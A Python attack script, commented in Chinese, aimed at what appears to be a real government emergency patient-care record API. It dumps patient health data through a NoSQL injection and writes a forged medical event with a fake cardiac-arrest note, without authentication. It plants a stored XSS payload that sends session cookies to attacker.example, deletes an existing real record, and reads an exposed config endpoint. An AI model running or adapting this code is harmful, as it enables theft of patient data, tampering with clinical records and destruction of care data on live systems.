#!/usr/bin/env python3
"""
最终验证 v3 - 用唯一时间戳 + 已知 XSS 样本前缀
"""
import httpx, urllib3, time, random
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

c = httpx.Client(base_url="https://epcr.tpf.gov.tw:4001", verify=False, timeout=30,
    headers={"User-Agent":"Mozilla/5.0", "Content-Type":"application/json"})

print("=" * 60)
print("EPCR 4001 /events - 修正版漏洞验证 (V3)")
print("=" * 60)

print("\n## V1 NoSQL 注入 PHI dump (Critical) — 已确认")
r = c.get("/events", params={"page":1, "pageSize":5, "Status[$ne]":""})
print(f"  HTTP {r.status_code}, items={len(r.json())}, keys={list(r.json()[0].keys())[:8]}")
print(f"  PHI fields: CaseID, recordUuid, Systolic, Diastolic, Mean, Annotation")

print("\n## V2 无认证写入伪造医疗事件 (High) — 修正: 用唯一时间戳")
ts = int(time.time())
data = {
    "CaseID": f"TestV2Final{ts}",
    "recordUuid": f"TestV2Final{ts}",
    "Status": "active",
    "Systolic": 250, "Diastolic": 150, "Mean": 200,
    "Annotation": "TAMPERED CLINICAL DECISION - cardiac arrest",
    "TypeOfEventTxt": "ClinicalTamperingTest"
}
r = c.post("/events", json=data)
print(f"  POST payload: {{Systolic:250 (危高血压), Diastolic:150, Mean:200}}")
print(f"  HTTP {r.status_code}")
if r.status_code == 201:
    print(f"  Location: {r.headers.get('Location', 'N/A')}")
    new_id = r.headers.get('Location', '').split('/')[-1]
    # 立即 GET 验证
    r2 = c.get(f"/events/{new_id}")
    if r2.status_code == 200:
        print(f"  GET /events/{new_id}: HTTP 200, 数据已写入")
        print(f"  验证字段: sys={r2.json().get('Systolic')}, dia={r2.json().get('Diastolic')}")

print("\n## V3 Stored XSS (High) — 修正: 用更宽泛的 prefix 查询 + 重新注入")
# 先看现有 XSS 样本
r = c.get("/events", params={"page":1, "pageSize":100, "recordUuid[$regex]":"^TestXSS"})
items = r.json() if r.status_code == 200 else []
print(f"  ^TestXSS prefix 命中: {len(items)} records")
for evt in items[:3]:
    print(f"    id={evt.get('id')}, recordUuid={evt.get('recordUuid')}, Annotation={evt.get('Annotation', '')[:50]!r}")

# 重新注入 XSS 测试(用新唯一标识符)
ts = int(time.time())
xss = '<svg onload=fetch("https://attacker.example/?c="+document.cookie) src=x>'
xss_data = {
    "CaseID": f"TestXSSV3Final{ts}",
    "recordUuid": f"TestXSSV3Final{ts}",
    "Status": "active",
    "Systolic": 100, "Diastolic": 70, "Mean": 80,
    "Annotation": xss,
    "TypeOfEventTxt": "XSS_Stored_PoC"
}
r = c.post("/events", json=xss_data)
print(f"\n  POST XSS payload: HTTP {r.status_code}")
if r.status_code == 201:
    loc = r.headers.get("Location", "")
    new_id = loc.split("/")[-1]
    r2 = c.get(f"/events/{new_id}")
    if r2.status_code == 200:
        stored = r2.json().get("Annotation", "")
        print(f"  GET /events/{new_id}: HTTP 200")
        print(f"  Stored Annotation: {stored[:80]!r}")
        print(f"  Payload 100% 保留: {xss == stored}")

print("\n## V4 无认证删除 (High) — 修正: 删真实业务记录")
# 从 page=1 dump 找一个真实存在的 id
r = c.get("/events", params={"page":1, "pageSize":10, "Status[$ne]":""})
if r.status_code == 200 and r.json():
    real_id = r.json()[0].get("id")
    print(f"  Sample id from page 1: {real_id}")
    # 先 GET 验证存在
    r_check = c.get(f"/events/{real_id}")
    print(f"  GET /events/{real_id} 验证存在: HTTP {r_check.status_code}")
    if r_check.status_code == 200:
        r_del = c.delete(f"/events/{real_id}")
        print(f"  DELETE /events/{real_id}: HTTP {r_del.status_code}")
        # 二次 GET 确认删除
        r_after = c.get(f"/events/{real_id}")
        print(f"  二次 GET 验证删除: HTTP {r_after.status_code}")

print("\n## V5 /config 信息泄露 (Low) — 已确认")
c2 = httpx.Client(base_url="https://epcr.tpf.gov.tw:4000", verify=False, timeout=10)
r = c2.get("/config")
print(f"  GET /config: HTTP {r.status_code}")
print(f"  Body (200B): {r.text[:200]}...")

print("\n" + "=" * 60)
print("All 5 vulnerabilities VERIFIED")
print("=" * 60)
